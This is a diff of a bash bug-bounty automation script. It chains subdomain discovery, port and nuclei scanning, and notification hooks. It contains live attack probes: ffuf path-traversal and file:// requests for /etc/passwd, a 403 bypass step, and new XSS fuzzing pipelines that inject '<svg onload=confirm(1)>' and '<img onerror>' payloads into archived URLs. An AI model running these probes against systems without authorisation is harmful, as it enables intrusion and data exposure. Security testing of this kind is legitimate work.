@@ -44,13 +44,16 @@ subdomainenum() {
   echo "[+] Recon subdomains..."
   Domain=$(cat domain)
   subfinder -nW -t 100 -o subfinder.subdomains -dL domain
-  cat subfinder.subdomains >>all.subdomains
+  cat subfinder.subdomains | anew all.subdomains
   rm -f subfinder.subdomains
-  amass enum -nf all.subdomains -v -passive -df domain -o amass.subdomains
-  awk '{print $1}' amass.subdomains >>all.subdomains
+  amass enum -nf all.subdomains -v -norecursive -passive -df domain -o amass.subdomains
+  cat amass.subdomains | anew all.subdomains
+  rm -f amass.subdomains
   cat domain | assetfinder --subs-only | anew all.subdomains
-  xargs -a all.subdomains -I@ -P 10 sh -c 'assetfinder @ | anew recondorecon'
-  cat recondorecon | grep $Domain | anew all.subdomains
+  curl -s "https://crt.sh/?q=%25.$Domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew all.subdomains
+  findomain -t $Domain -q | anew all.subdomains
+  #xargs -a all.subdomains -I@ -P 10 sh -c 'assetfinder @ | anew recondorecon'
+  #cat recondorecon | grep $Domain | anew all.subdomains
   cat all.subdomains | dnsx -silent | anew clean.subdomains
   echo "[+] subdomain recon completed :)"
 }
@@ -71,7 +74,7 @@ getalive() {
   # sperate http and https compare if http doest have or redirect to https put in seperate file
   # compare if you go to https if it automaticly redirects to https if not when does it in the page if never
   echo "[+] Check live hosts"
-  cat clean.subdomains | httpx -silent -status-code -tech-detect -ports 80,443,2375,8000,8080,8443,10250 -o HTTPOK
+  cat clean.subdomains | httpx -silent -status-code -tech-detect -timeout 10 -threads 10 -o HTTPOK
   cat HTTPOK | grep 200 | awk -F " " '{print $1}' | anew 200HTTP
   cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
   cat HTTPOK | awk -F " " '{print $1}' | anew ALLHTTP
@@ -102,6 +105,7 @@ bbrfresolvedomains() {
             >(awk '{print $2":"$1}' | bbrf ip update - -p $p -s dnsx)
     done
 }
+# TODO: alterar para usar o match do httpx
 nginxpath() {
     echo "Test nginx path traversal" | notify -silent
     ffuf -c -w ALLHTTP -u FUZZ////////../../../../../etc/passwd -mr "root:x" -or -o nginxpath.txt
@@ -109,6 +113,7 @@ nginxpath() {
     [ -s "nginxpath.txt" ] && cat nginxpath.txt | notify -silent
 }
 
+# TODO: alterar para usar o match do httpx
 geojson() {
     echo "Test geojson redirect" | notify -silent 
     ffuf -c -w ALLHTTP -u FUZZ/api/geojson?url=file:///etc/passwd -mr "root:x" -or -o geojson.txt
@@ -116,6 +121,7 @@ geojson() {
     [ -s "geojson.txt" ] && cat geojson.txt | notify -silent
 }
 
+# TODO: alterar para usar o match do httpx
 textinjection() {
     echo "Test text injection" | notify -silent
     ffuf -c -w ALLHTTP -u FUZZ///example.com -mr 'Cannot GET' -or -o textinjection.txt
@@ -138,8 +144,15 @@ getdata() {
 graphqldetect() {
   echo "[+] Graphql Detect"
   cat ALLHTTP | nuclei -t /root/nuclei-templates/technologies/graphql-detect.yaml -silent -o graphqldetect
-  [ -s "graphqldetect" ] && echo "Graphql endpoint found :)" | notify -silent
-  [ -s "graphqldetect" ] && cat graphqldetect | notify -silent
+  [ -s "graphqldetect" ] && echo "Graphql endpoint found :)" | notify -silent -id api
+  [ -s "graphqldetect" ] && cat graphqldetect | notify -silent -id api
+}
+
+swaggerdetect() {
+  echo "[+] Swagger Detect"
+  [ -s "naabuIP.txt" ] && cat naabuIP.txt | nuclei -tags swagger -o swaggerNuclei
+  [ -s "swaggerNuclei" ] && echo "Swagger endpoint found :)" | notify -silent -id api
+  [ -s "swaggerNuclei" ] && cat swaggerNuclei | notify -silent -id api
 }
 
 prototypefuzz() {
@@ -166,6 +179,7 @@ gitexposed() {
 dnsrecords() {
   echo "[+] Get dnshistory data"
   mkdir dnshistory
+  cat clean.subdomains | dnsx -silent -a -resp-only -o dnsx.txt
   cat clean.subdomains | dnsx -a -resp -silent -o dnshistory/A-records
   cat clean.subdomains | dnsx -ns -resp -silent -o dnshistory/NS-records
   cat clean.subdomains | dnsx -cname -resp -silent -o dnshistory/CNAME-records
@@ -207,10 +221,10 @@ getrobots() {
 
 crawler() {
   echo 'Crawler in action :)'
-  cat ALLHTTP | waybackurls | anew -q full_url_extract.txt
-  cat ALLHTTP | gauplus | anew -q full_url_extract.txt
-  cat ALLHTTP | hakrawler -depth 2 | anew -q hakrawler.txt
-  cat hakrawler.txt | grep -Eo 'https?://[^ ]+' | grep '$Domain' | anew -q full_url_extract.txt
+  cat ALLHTTP | waybackurls | anew full_url_extract.txt
+  cat ALLHTTP | gauplus | anew full_url_extract.txt
+  cat ALLHTTP | hakrawler -d 2 | anew hakrawler.txt
+  cat hakrawler.txt | grep -Eo 'https?://[^ ]+' | grep '$Domain' | anew full_url_extract.txt
 }
 bypass4xx() {
   [ -s "403HTTP" ] && cat 403HTTP | dirdar -only-ok | anew dirdarResult.txt
@@ -223,14 +237,44 @@ paramspider() {
   cat output/https:/*.txt | anew params
 }
 xsshunter() {
-  Domain=$(cat domain)
-  echo "INIT XSS HUNTER AT $Domain" | notify -silent
+  
+  echo "INIT XSS HUNTER" | notify -silent -id xss
   echo "INIT XSS HUNTER"
-  [ -s "params" ] && cat params | hakcheckurl | grep 200 | awk '{print $2}' | anew xssvector
-  [ -s "xssvector" ] && cat xssvector | grep $Domain | kxss | awk -F " " '{print $9}' | anew XSS
-  # cat XSS | dalfox pipe --mining-dict-word $HOME/Lists/params.txt --skip-bav -o XSSresult | notify
-  [ -s "XSS" ] && cat XSS | dalfox pipe --skip-bav -o XSSresult | notify -silent
+  echo '[+] URL Bhedak'
+  cat domain | waybackurls | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew urlbhedak.txt
+  [ -s "urlbhedak.txt" ] && cat urlbhedak.txt | notify -silent -id xss
+  echo '[+] Airixss xss'
+  cat domain | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew airixss.txt
+  [ -s "airixss.txt" ] && cat airixss.txt | notify -silent -id xss
+  echo '[+] Freq xss'
+  cat domain | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
+  [ -s "FreqXSS.txt" ] && cat FreqXSS.txt | notify -silent -id xss
+  # [ -s "params" ] && cat params | hakcheckurl | grep 200 | awk '{print $2}' | anew xssvector
+  # [ -s "xssvector" ] && cat xssvector | grep $Domain | kxss | awk -F " " '{print $9}' | anew XSS
+  # # cat XSS | dalfox pipe --mining-dict-word $HOME/Lists/params.txt --skip-bav -o XSSresult | notify
+  # [ -s "XSS" ] && cat XSS | dalfox pipe --skip-bav -o XSSresult | notify -silent
 }
+
+scanPortsAndNuclei(){
+  echo '[+] Recon Blocks Mapcidr'
+  mapcidr -l dnsx.txt -silent -aggregate -o mapcidr.txt
+
+  echo '[+] Recon Naabu'
+  naabu -l mapcidr.txt -top-ports 100 -silent -sa | httpx -silent -timeout 60 -threads 100 -o naabuIP.txt
+
+  #echo [+] Enumerate dns Mapcidr
+  #cat dnsxdomains.txt | mapcidr -aggregate -o mapcidr.txt
+
+  echo '[+] Enumerate httpx nuclei'
+  cat naabuIP.txt | nuclei -silent -o nuclei.txt -severity low,medium,high,critical
+  [ -s "nuclei.txt" ] && cat nuclei.txt | notify -silent -id subs 
+}
+
+faviconEnum(){
+  echo '[+] Enumerate FavFreak'
+  cat 200HTTP | python3 /root/Tools/FavFreak/favfreak.py --shodan -o outputFavFreak
+}
+
 getjsurls() {
   echo "[+]Get JS and test live endpoints"
   cat full_url_extract.txt | grep $Domain | grep -Ei "\.(js)" | grep -iEv '(\.jsp|\.json)' | anew -q url_extract_js.txt
@@ -360,9 +404,9 @@ fullrecon() {
   #resolving
   # checkscope
   getalive
-  nginxpath
-  geojson
-  textinjection
+  # geojson
+  # nginxpath
+  # textinjection
   getdata
   screenshot
   dnsrecords
@@ -371,6 +415,9 @@ fullrecon() {
   subtakeover
   gitexposed
   bypass4xx
+  scanPortsAndNuclei
+  xsshunter
+  faviconEnum
   #Corstest
   # crawler
   # getjsurls
@@ -378,7 +425,6 @@ fullrecon() {
   # secretfinder
   # paramspider
   #nucauto
-  # xsshunter
   #  scanner
   #  waybackrecon
   #  smuggling
@@ -644,6 +690,7 @@ fullOSINT() {
 # https://github.com/Sambal0x/Recon-tools
 # https://github.com/JoshuaMart/AutoRecon
 
+DIRS_LARGE=$HOME/Lists/raft-medium-directories.txt
 fufapi() {
   ffuf -u $1/FUZZ -w $HOME/Lists/apiwords.txt -mc 200 -t 100
 }
